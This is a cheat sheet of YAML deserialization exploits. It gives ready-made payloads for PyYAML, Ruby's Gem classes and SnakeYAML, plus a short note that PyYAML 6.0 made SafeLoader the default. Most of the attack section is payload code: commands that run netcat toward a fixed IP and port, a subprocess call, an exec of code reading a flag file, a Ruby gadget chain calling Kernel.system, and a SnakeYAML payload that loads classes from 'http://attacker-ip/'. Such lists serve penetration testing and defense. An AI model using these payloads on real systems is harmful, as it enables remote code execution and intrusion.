# YAML Deserialization

## Summary

* [Tools](#tools)
* [Exploit](#exploit)
    * [PyYAML](#pyyaml)
    * [ruamel.yaml](#ruamelyaml)
    * [Ruby](#ruby)
    * [SnakeYAML](#snakeyaml)
* [References](#references)

## Tools

* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)
* [artsploit/yaml-payload](https://github.com/artsploit/yaml-payload) - A tiny project for generating SnakeYAML deserialization payloads
* [mbechler/marshalsec](https://github.com/mbechler/marshalsec)

## Exploit

### PyYAML

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

Since PyYaml version 6.0, the default loader for ```load``` has been switched to SafeLoader mitigating the risks against Remote Code Execution.
[PR fixing the vulnerabily](https://github.com/yaml/pyyaml/issues/420)

The vulnerable sinks are now ```yaml.unsafe_load``` and ```yaml.load(input, Loader=yaml.UnsafeLoader)```

```
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)
```

## Ruamel.yaml

## Ruby

```ruby
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
```

## SnakeYAML

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```


## References

* [Python Yaml Deserialization - hacktricks.xyz][https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization]
* [YAML Deserialization Attack in Python - Manmeet Singh & Ashish Kukret - November 13][https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf]
* [PyYAML Documentation](https://pyyaml.org/wiki/PyYAMLDocumentation)
* [Blind Remote Code Execution through YAML Deserialization - 09 JUNE 2021](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)
* [[CVE-2019-20477]- 0Day YAML Deserialization Attack on PyYAML version <= 5.1.2 - @_j0lt](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
